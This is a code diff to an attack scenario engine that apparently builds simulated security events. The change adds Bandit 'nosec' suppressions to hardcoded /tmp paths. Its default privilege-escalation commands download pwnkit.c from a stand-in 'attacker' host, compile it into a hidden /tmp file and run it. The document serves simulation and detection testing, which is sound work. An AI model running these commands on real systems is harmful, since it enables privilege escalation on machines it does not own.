@@ -621,7 +621,7 @@ class AttackScenarioEngine:
                     "src_host": target_host,
                     "user": target_user,
                     "action": "delete",
-                    "file_path": f"/tmp/staging/file_{i}.dat",
+                    "file_path": f"/tmp/staging/file_{i}.dat",  # nosec B108
                     "description": f"File deleted: /tmp/staging/file_{i}.dat",
                 })
 
@@ -757,9 +757,9 @@ class AttackScenarioEngine:
         elif technique in _PRIV_ESCALATION_TECHNIQUES:
             ts = base_time
             cmds = indicators.get("commands", [
-                "curl -o /tmp/.pwnkit http://attacker/pwnkit.c",
-                "gcc /tmp/.pwnkit -o /tmp/.pk",
-                "/tmp/.pk",
+                "curl -o /tmp/.pwnkit http://attacker/pwnkit.c",  # nosec B108
+                "gcc /tmp/.pwnkit -o /tmp/.pk",  # nosec B108
+                "/tmp/.pk",  # nosec B108
             ])
             for i, cmd in enumerate(cmds):
                 events.append({
